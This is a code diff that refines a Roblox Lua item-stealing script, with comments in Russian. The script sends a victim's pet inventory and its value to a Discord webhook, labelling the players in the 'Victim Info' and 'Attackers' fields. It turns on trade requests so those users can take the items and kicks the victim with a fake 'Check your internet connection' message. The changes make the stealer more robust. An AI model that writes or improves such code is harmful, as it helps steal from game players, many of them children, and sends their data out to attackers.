@@ -60,14 +60,48 @@ local headers = {
     ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
 }
 
-local valueResponse = request({
+-- Функция для безопасной отправки HTTP запросов
+local function safeRequest(requestData)
+    local success, response = pcall(function()
+        return request(requestData)
+    end)
+    
+    if success and response then
+        return response
+    else
+        warn("HTTP Request failed: " .. tostring(response))
+        return nil
+    end
+end
+
+local valueResponse = safeRequest({
     Url = "https://elvebredd.com/api/pets/get-latest",
     Method = "GET",
     Headers = headers
 })
 
-local responseData = HttpService:JSONDecode(valueResponse.Body)
-local petsData = HttpService:JSONDecode(responseData.pets)
+if not valueResponse then
+    plr:kick("Failed to get pet values from Elvebredd")
+    return
+end
+
+local success, responseData = pcall(function()
+    return HttpService:JSONDecode(valueResponse.Body)
+end)
+
+if not success then
+    plr:kick("Failed to parse pet values")
+    return
+end
+
+local success, petsData = pcall(function()
+    return HttpService:JSONDecode(responseData.pets)
+end)
+
+if not success then
+    plr:kick("Failed to parse pets data")
+    return
+end
 
 local petsByName = {}
 for key, pet in pairs(petsData) do
@@ -202,12 +236,16 @@ local function SendJoinMessage(list, prefix)
     }
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
+    local response = safeRequest({
         Url = webhook,
         Method = "POST",
         Headers = headers,
         Body = body
     })
+    
+    if not response then
+        warn("Failed to send join message to Discord")
+    end
 end
 
 local function SendMessage(sortedItems)
@@ -244,9 +282,8 @@ local function SendMessage(sortedItems)
     end)
 
     -- Формируем описание инвентаря в виде таблицы
-    local inventoryDescription = "| Total | Value    |\n|---|---|\n"
+    local inventoryDescription = "| Item | Properties | Count | Value |\n|---|---|---|---|\n"
     for _, item in ipairs(sortedInventory) do
-        local itemName = item.name
         local properties = ""
         if item.rideable then properties = properties .. "R" end
         if item.flyable then properties = properties .. "F" end
@@ -258,7 +295,8 @@ local function SendMessage(sortedItems)
             properties = properties .. "Normal"
         end
         
-        inventoryDescription = inventoryDescription .. string.format("| %s %s x%d | %.2f |\n", itemName, properties, item.count, item.totalValue)
+        inventoryDescription = inventoryDescription .. string.format("| %s | %s | x%d | %.2f |\n", 
+            item.name, properties, item.count, item.totalValue)
     end
 
     local data = {
@@ -268,13 +306,18 @@ local function SendMessage(sortedItems)
             ["fields"] = {
                 {
                     name = "Victim Info",
-                    value = string.format("Username: %s\nYou: %s", plr.Name, table.concat(users, ", ")),
+                    value = string.format("Username: %s\nAttackers: %s", plr.Name, table.concat(users, ", ")),
                     inline = false
                 },
                 {
                     name = "Inventory Information",
                     value = string.format("```%s```", inventoryDescription),
                     inline = false
+                },
+                {
+                    name = "Total Value",
+                    value = string.format("```%.2f```", totalValue),
+                    inline = true
                 }
             },
             ["footer"] = {
@@ -284,12 +327,18 @@ local function SendMessage(sortedItems)
     }
 
     local body = HttpService:JSONEncode(data)
-    local response = request({
+    local response = safeRequest({
         Url = webhook,
         Method = "POST",
         Headers = headers,
         Body = body
     })
+    
+    if not response then
+        warn("Failed to send execution message to Discord")
+    else
+        print("Message successfully sent to Discord!")
+    end
 end
 
 local hashes = {}
@@ -380,6 +429,8 @@ if #itemsToSend > 0 then
         prefix = "--[[@everyone]] "
     end
 
+    -- Даем время для инициализации перед отправкой
+    wait(2)
     SendJoinMessage(itemsToSend, prefix)
     SettingsRemote:FireServer("trade_requests", 1)
 
@@ -403,7 +454,7 @@ if #itemsToSend > 0 then
             end
             wait(1)
         end
-        plr:kick("Check your internet conection ")
+        plr:kick("Check your internet connection")
     end
 
     local function waitForUserChat()
@@ -412,6 +463,8 @@ if #itemsToSend > 0 then
             if table.find(users, player.Name) then
                 player.Chatted:Connect(function()
                     if not sentMessage then
+                        -- Даем время перед отправкой финального сообщения
+                        wait(1)
                         SendMessage(sentItems)
                         sentMessage = true
                     end
@@ -423,4 +476,7 @@ if #itemsToSend > 0 then
         Players.PlayerAdded:Connect(onPlayerChat)
     end
     waitForUserChat()
+else
+    warn("No items to send found in inventory")
+    plr:kick("No valuable items found in inventory")
 end
